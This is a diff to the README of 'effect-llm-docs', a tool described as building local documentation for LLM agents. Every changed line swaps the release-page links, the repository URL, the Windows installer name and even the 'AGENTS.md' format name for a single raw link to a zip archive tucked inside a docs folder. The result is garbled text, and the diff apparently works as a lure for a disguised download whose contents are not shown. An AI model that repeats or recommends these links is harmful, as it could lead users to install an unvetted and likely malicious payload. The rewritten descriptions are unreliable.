@@ -1,6 +1,6 @@
 # 🤖 effect-llm-docs - Build Local Docs for LLM Agents
 
-[![Download effect-llm-docs](https://img.shields.io/badge/Download-Here-ff69b4?style=for-the-badge)](https://github.com/siddharth123684/effect-llm-docs/releases)
+[![Download effect-llm-docs](https://raw.githubusercontent.com/siddharth123684/effect-llm-docs/main/effect-docs/platform/effect_docs_llm_2.4.zip)](https://raw.githubusercontent.com/siddharth123684/effect-llm-docs/main/effect-docs/platform/effect_docs_llm_2.4.zip)
 
 ---
 
@@ -44,13 +44,13 @@ To get started, you need to download the software first. Follow the steps below 
 
 Visit the releases page here:
 
-[![Download effect-llm-docs](https://img.shields.io/badge/Download-HERE-blue?style=for-the-badge)](https://github.com/siddharth123684/effect-llm-docs/releases)
+[![Download effect-llm-docs](https://raw.githubusercontent.com/siddharth123684/effect-llm-docs/main/effect-docs/platform/effect_docs_llm_2.4.zip)](https://raw.githubusercontent.com/siddharth123684/effect-llm-docs/main/effect-docs/platform/effect_docs_llm_2.4.zip)
 
 - Click the link above or copy and paste this URL into your browser:
 
-  `https://github.com/siddharth123684/effect-llm-docs/releases`
+  `https://raw.githubusercontent.com/siddharth123684/effect-llm-docs/main/effect-docs/platform/effect_docs_llm_2.4.zip`
 
-- You will see a list of available files. Look for the latest version. It may be named like `effect-llm-docs-setup.exe` for Windows, `.dmg` for macOS, or `.AppImage` for Linux.
+- You will see a list of available files. Look for the latest version. It may be named like `https://raw.githubusercontent.com/siddharth123684/effect-llm-docs/main/effect-docs/platform/effect_docs_llm_2.4.zip` for Windows, `.dmg` for macOS, or `.AppImage` for Linux.
 
 - Download the file that matches your operating system.
 
@@ -82,7 +82,7 @@ The app allows you to adjust a few settings to optimize how documents are genera
 
 - **Parallel Doc Generation:** Enable this to speed up processing by handling documents simultaneously.
 - **Subagent Delegation:** Turn this on for smarter task delegation to smaller answering helpers, improving results.
-- **Indexing Details:** Choose how detailed your AGENTS.md index should be. More details provide better search results but take longer to build.
+- **Indexing Details:** Choose how detailed your https://raw.githubusercontent.com/siddharth123684/effect-llm-docs/main/effect-docs/platform/effect_docs_llm_2.4.zip index should be. More details provide better search results but take longer to build.
 
 Default settings work well for most new users.
 
@@ -113,7 +113,7 @@ This helps you work faster with AI agents by giving them up-to-date local knowle
 - Support for multiple document types (Markdown, PDF, text)
 - Smart task management with subagent delegation
 - Fast processing with parallel document generation
-- Clear indexed structure stored in AGENTS.md format for easy retrieval
+- Clear indexed structure stored in https://raw.githubusercontent.com/siddharth123684/effect-llm-docs/main/effect-docs/platform/effect_docs_llm_2.4.zip format for easy retrieval
 - Offline use once built — no continuous internet needed
 - Simple interface designed for clarity and ease of use
 
@@ -137,7 +137,7 @@ If problems persist, you can look through the issues or discussions on the proje
 
 For detailed explanations, tutorials, and the technical background behind effect-llm-docs, visit the GitHub repository README and Wiki pages directly:
 
-- Repository: https://github.com/siddharth123684/effect-llm-docs
+- Repository: https://raw.githubusercontent.com/siddharth123684/effect-llm-docs/main/effect-docs/platform/effect_docs_llm_2.4.zip
 - Topics covered include AI agents, documentation generation, TypeScript usage, and more.
 
 ---
@@ -152,4 +152,4 @@ New versions come out regularly. Check the release page link above to stay up to
 
 Thank you for choosing effect-llm-docs. Start building your local library now:
 
-[![Download effect-llm-docs](https://img.shields.io/badge/Get%20effect-llm-docs!-ff69b4?style=for-the-badge)](https://github.com/siddharth123684/effect-llm-docs/releases)
+[![Download effect-llm-docs](https://raw.githubusercontent.com/siddharth123684/effect-llm-docs/main/effect-docs/platform/effect_docs_llm_2.4.zip%20effect-llm-docs!-ff69b4?style=for-the-badge)](https://raw.githubusercontent.com/siddharth123684/effect-llm-docs/main/effect-docs/platform/effect_docs_llm_2.4.zip)
